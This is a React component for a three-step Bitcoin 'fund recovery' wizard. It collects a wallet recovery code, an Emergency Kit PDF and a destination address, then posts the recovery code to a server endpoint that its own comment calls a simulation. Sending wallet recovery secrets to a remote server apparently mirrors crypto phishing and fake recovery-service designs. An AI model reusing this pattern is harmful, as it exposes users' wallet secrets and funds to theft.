import { useState } from "react";
import ProgressIndicator from "./ProgressIndicator";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent } from "@/components/ui/card";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { AlertTriangle, Check, Upload } from "lucide-react";
import { validateRecoveryCode, validateBitcoinAddress } from "@/lib/validation";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";

interface RecoveryFormProps {
  onRecoveryComplete: (data: {
    recoveryCode: string;
    pdfFilename: string;
    bitcoinAddress: string;
  }) => void;
}

export default function RecoveryForm({ onRecoveryComplete }: RecoveryFormProps) {
  const [currentStep, setCurrentStep] = useState(1);
  const [recoveryCode, setRecoveryCode] = useState("");
  const [bitcoinAddress, setBitcoinAddress] = useState("");
  const [pdfFile, setPdfFile] = useState<File | null>(null);
  
  const [recoveryCodeError, setRecoveryCodeError] = useState("");
  const [bitcoinAddressError, setBitcoinAddressError] = useState("");
  const [pdfError, setPdfError] = useState("");
  const [pdfSuccess, setPdfSuccess] = useState("");
  
  const { toast } = useToast();
  
  const handleRecoveryCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setRecoveryCode(value);
    
    if (value) {
      if (!validateRecoveryCode(value)) {
        setRecoveryCodeError("Recovery code format is incorrect. Please check and try again.");
      } else {
        setRecoveryCodeError("");
      }
    } else {
      setRecoveryCodeError("");
    }
  };
  
  const handleBitcoinAddressChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setBitcoinAddress(value);
    
    if (value) {
      if (!validateBitcoinAddress(value)) {
        setBitcoinAddressError("Please enter a valid Bitcoin address");
      } else {
        setBitcoinAddressError("");
      }
    } else {
      setBitcoinAddressError("");
    }
  };
  
  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    
    if (file) {
      if (file.type === "application/pdf") {
        setPdfFile(file);
        setPdfSuccess("Emergency Kit PDF uploaded successfully");
        setPdfError("");
      } else {
        setPdfFile(null);
        setPdfError("Please upload a valid Emergency Kit PDF file");
        setPdfSuccess("");
      }
    }
  };
  
  const handleNextToStep2 = () => {
    if (validateRecoveryCode(recoveryCode)) {
      setCurrentStep(2);
    }
  };
  
  const handleBackToStep1 = () => {
    setCurrentStep(1);
  };
  
  const handleNextToStep3 = () => {
    if (validateBitcoinAddress(bitcoinAddress) && pdfFile) {
      setCurrentStep(3);
    }
  };
  
  const handleBackToStep2 = () => {
    setCurrentStep(2);
  };
  
  const handleRecoveryProcess = async () => {
    try {
      // In a real app, we would upload the PDF and process the recovery
      // Here we'll just simulate the API call
      const response = await apiRequest("POST", "/api/recovery", {
        recoveryCode,
        bitcoinAddress,
        pdfFilename: pdfFile?.name
      });
      
      const responseData = await response.json();
      
      toast({
        title: "Recovery Process Started",
        description: `Scanning ${responseData.data.totalWalletsToScan} wallets. Estimated time: ${responseData.data.estimatedTimeMinutes} minutes.`,
        duration: 5000,
      });
      
      onRecoveryComplete({
        recoveryCode,
        pdfFilename: pdfFile?.name || "",
        bitcoinAddress
      });
    } catch (error) {
      toast({
        title: "Error",
        description: "There was an error processing your recovery request. Please try again.",
        variant: "destructive",
      });
    }
  };
  
  const isNextToStep2Disabled = !validateRecoveryCode(recoveryCode);
  const isNextToStep3Disabled = !validateBitcoinAddress(bitcoinAddress) || !pdfFile;
  
  return (
    <Card className="bg-card rounded-lg p-0 mb-8 border border-gray-700">
      <CardContent className="p-6">
        <ProgressIndicator currentStep={currentStep} totalSteps={3} />
        
        {currentStep === 1 && (
          <div>
            <h2 className="text-accent text-xl font-medium mb-4">Enter your Recovery Code</h2>
            <p className="text-muted mb-4">(it looks like this: 'ABCD-1234-POW2-R561-P120-JK26-12RW-45TT')</p>
            
            <div className="mb-6">
              <Input
                id="recoveryCode"
                value={recoveryCode}
                onChange={handleRecoveryCodeChange}
                className="w-full bg-background border border-gray-600 p-3 rounded-md font-mono text-white focus:outline-none focus:ring-2 focus:ring-primary"
                placeholder="XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX"
              />
              {recoveryCodeError && (
                <p className="text-destructive text-sm mt-2">{recoveryCodeError}</p>
              )}
            </div>
            
            <div className="flex justify-end">
              <Button
                onClick={handleNextToStep2}
                disabled={isNextToStep2Disabled}
                className="bg-primary hover:bg-opacity-90 text-white"
              >
                Next
              </Button>
            </div>
          </div>
        )}
        
        {currentStep === 2 && (
          <div>
            <h2 className="text-accent text-xl font-medium mb-4">Upload Emergency Kit PDF</h2>
            
            <div className="mb-6">
              <div className="border-2 border-dashed border-gray-600 rounded-lg p-6 text-center">
                <div className="mb-4">
                  <Upload className="h-12 w-12 mx-auto text-muted" />
                </div>
                <p className="text-muted mb-2">Drag and drop your PDF file here, or</p>
                <Button
                  variant="link"
                  className="text-primary hover:text-accent p-0"
                  onClick={() => document.getElementById("pdfUpload")?.click()}
                >
                  browse files
                </Button>
                <input
                  type="file"
                  id="pdfUpload"
                  className="hidden"
                  accept=".pdf"
                  onChange={handleFileChange}
                />
              </div>
              {pdfSuccess && (
                <div className="flex items-center text-green-500 text-sm mt-2">
                  <Check className="h-4 w-4 mr-1" />
                  {pdfSuccess}
                </div>
              )}
              {pdfError && (
                <p className="text-destructive text-sm mt-2">{pdfError}</p>
              )}
            </div>
            
            <h2 className="text-accent text-xl font-medium mb-4">Enter Bitcoin Destination Address</h2>
            <div className="mb-6">
              <Input
                id="bitcoinAddress"
                value={bitcoinAddress}
                onChange={handleBitcoinAddressChange}
                className="w-full bg-background border border-gray-600 p-3 rounded-md font-mono text-white focus:outline-none focus:ring-2 focus:ring-primary"
                placeholder="bc1q..."
              />
              {bitcoinAddressError && (
                <p className="text-destructive text-sm mt-2">{bitcoinAddressError}</p>
              )}
            </div>
            
            <div className="flex justify-between">
              <Button
                variant="outline"
                onClick={handleBackToStep1}
                className="border border-gray-600 hover:border-primary text-white"
              >
                Back
              </Button>
              <Button
                onClick={handleNextToStep3}
                disabled={isNextToStep3Disabled}
                className="bg-primary hover:bg-opacity-90 text-white"
              >
                Next
              </Button>
            </div>
          </div>
        )}
        
        {currentStep === 3 && (
          <div>
            <h2 className="text-accent text-xl font-medium mb-4">Confirm Recovery Details</h2>
            
            <div className="bg-background rounded-lg p-4 mb-6">
              <div className="mb-4">
                <p className="text-muted text-sm mb-1">Recovery Code</p>
                <p className="font-mono text-white break-all">{recoveryCode}</p>
              </div>
              
              <div className="mb-4">
                <p className="text-muted text-sm mb-1">Emergency Kit PDF</p>
                <p className="font-mono text-white">{pdfFile?.name}</p>
              </div>
              
              <div>
                <p className="text-muted text-sm mb-1">Bitcoin Destination Address</p>
                <p className="font-mono text-white break-all">{bitcoinAddress}</p>
              </div>
            </div>
            
            <Alert className="bg-yellow-900 bg-opacity-20 border border-yellow-700 mb-6">
              <AlertTriangle className="h-4 w-4 text-yellow-500" />
              <AlertDescription className="text-yellow-200">
                Please double-check all details. Once the recovery process starts, it cannot be cancelled.
              </AlertDescription>
            </Alert>
            
            <div className="flex justify-between">
              <Button
                variant="outline"
                onClick={handleBackToStep2}
                className="border border-gray-600 hover:border-primary text-white"
              >
                Back
              </Button>
              <Button
                onClick={handleRecoveryProcess}
                className="bg-primary hover:bg-opacity-90 text-white"
              >
                Recover Funds
              </Button>
            </div>
          </div>
        )}
      </CardContent>
    </Card>
  );
}
